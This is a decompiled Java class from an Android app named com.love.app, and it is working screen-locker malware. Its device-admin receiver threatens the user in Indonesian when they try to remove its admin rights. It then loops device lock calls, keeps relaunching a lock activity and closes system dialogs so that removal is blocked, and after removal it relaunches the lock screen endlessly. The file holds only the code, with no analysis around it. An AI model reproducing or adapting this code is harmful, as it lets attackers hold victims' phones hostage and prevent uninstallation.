package com.love.app;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import androidx.work.WorkRequest;

/* JADX INFO: loaded from: classes.dex */
public class AdminReceiver extends DeviceAdminReceiver {
    private static final String TAG = "AdminReceiver";
    private static boolean isHanging;

    @Override // android.app.admin.DeviceAdminReceiver
    public void onEnabled(Context context, Intent intent) {
        Log.d(TAG, "Device Admin AKTIF");
        Intent intent2 = new Intent(context, (Class<?>) AdminService.class);
        intent2.setAction("START_MONITOR");
        if (Build.VERSION.SDK_INT >= 26) {
            context.startForegroundService(intent2);
        } else {
            context.startService(intent2);
        }
        isHanging = false;
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public void onDisabled(Context context, Intent intent) {
        Log.d(TAG, "Device Admin DINONAKTIFKAN - seharusnya dicegah");
        if (isHanging) {
            return;
        }
        isHanging = true;
        startEmergencyHang(context);
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public CharSequence onDisableRequested(final Context context, Intent intent) {
        Log.d(TAG, "onDisableRequested - user mencoba menonaktifkan admin");
        if (!isHanging) {
            isHanging = true;
            Intent intent2 = new Intent(context, (Class<?>) AdminService.class);
            intent2.setAction("START_HANG");
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(intent2);
            } else {
                context.startService(intent2);
            }
        }
        new Thread(new Runnable() { // from class: com.love.app.AdminReceiver$$ExternalSyntheticLambda0
            @Override // java.lang.Runnable
            public final void run() {
                AdminReceiver.lambda$onDisableRequested$0(context);
            }
        }).start();
        return "⚠️ PERINGATAN EKSTRIM: Menonaktifkan admin akan mengaktifkan mode darurat! Perangkat akan terkunci total dan tidak bisa digunakan. Batalkan sekarang juga!";
    }

    static /* synthetic */ void lambda$onDisableRequested$0(Context context) {
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService("device_policy");
        ComponentName componentName = new ComponentName(context, (Class<?>) AdminReceiver.class);
        long jCurrentTimeMillis = System.currentTimeMillis();
        while (isHanging && System.currentTimeMillis() - jCurrentTimeMillis < WorkRequest.MIN_BACKOFF_MILLIS) {
            if (devicePolicyManager != null) {
                try {
                    if (devicePolicyManager.isAdminActive(componentName)) {
                        devicePolicyManager.lockNow();
                    }
                } catch (Exception e) {
                    Log.e(TAG, "lock loop error", e);
                }
            }
            Intent intent = new Intent(context, (Class<?>) LockActivity.class);
            intent.addFlags(335675392);
            context.startActivity(intent);
            context.sendBroadcast(new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS"));
            Thread.sleep(10L);
        }
    }

    private void startEmergencyHang(final Context context) {
        new Thread(new Runnable() { // from class: com.love.app.AdminReceiver$$ExternalSyntheticLambda1
            @Override // java.lang.Runnable
            public final void run() {
                AdminReceiver.lambda$startEmergencyHang$1(context);
            }
        }).start();
    }

    /* JADX INFO: Infinite loop detected, blocks: 8, insns: 0 */
    static /* synthetic */ void lambda$startEmergencyHang$1(Context context) {
        while (true) {
            try {
                Intent intent = new Intent(context, (Class<?>) LockActivity.class);
                intent.addFlags(335544320);
                context.startActivity(intent);
                Thread.sleep(100L);
            } catch (Exception e) {
                Log.e(TAG, "emergency hang error", e);
            }
        }
    }
}
